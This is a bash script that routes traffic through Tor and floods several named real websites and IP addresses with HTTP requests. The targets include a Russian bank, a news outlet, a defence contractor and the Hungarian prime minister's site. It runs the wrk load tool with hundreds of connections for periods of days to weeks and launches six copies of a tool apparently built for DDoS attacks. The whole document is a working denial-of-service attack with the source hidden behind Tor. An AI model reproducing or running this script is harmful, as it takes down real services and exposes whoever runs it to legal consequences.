#!/bin/bash


[[ -z $(service tor status | grep "tor is running") ]] && service tor start
sleep 5

NUM0=4
NUM1=$(($NUM0*2))
NUM2=$(($NUM1*4))
DLEN=$((3*3600*24))
URLS=(
  "https://alfagroup.ru" 
  "https://rt.com" 
  "https://thalesgroup.com"
   "http://thalesgroup.com"
  "https://primeminister.hu"
   "http://primeminister.hu"
  "https://13.37.9.16:443/"             # yet more thalesgroup
   "http://13.37.9.16:80/"              # and more of them
  "https://84.206.129.92:443/"          # yet more mr orban personal site
   "http://84.206.129.92:80/"           # and more of mr orban's
   "http://62.76.102.63:80/"
  "https://62.76.102.63:443/"
   "http://46.48.118.29:80/"
  "https://46.48.118.29:443/"
  )

for TURL in ${URLS[*]}
do
  A=$NUM0
  B=$DLEN
  C=$TURL
  
  [[ $TURL == "https://alfagroup.ru" ]] && A=$NUM1
  [[ $TURL == "https://rt.com" ]] && A=$NUM1
  [[ $TURL == "https://thalesgroup.com" ]] && A=$NUM1
  [[ $TURL == "https://primeminister.hu" ]] && A=$NUM1
  
  torsocks wrk -c$NUM2 -t$A -d$B --timeout 5s $C &
done   

torsocks wrk -c512 -t8 -d1048756 --timeout 5s https://rt.com &
torsocks wrk -c512 -t8 -d1048756 --timeout 5s https://thalesgroup.com &
torsocks wrk -c512 -t8 -d1048756 --timeout 5s https://primeminister.hu &

torsocks /root/Downloads/db1000n &  
torsocks /root/Downloads/db1000n &  
torsocks /root/Downloads/db1000n & 
torsocks /root/Downloads/db1000n & 
torsocks /root/Downloads/db1000n & 
torsocks /root/Downloads/db1000n & 
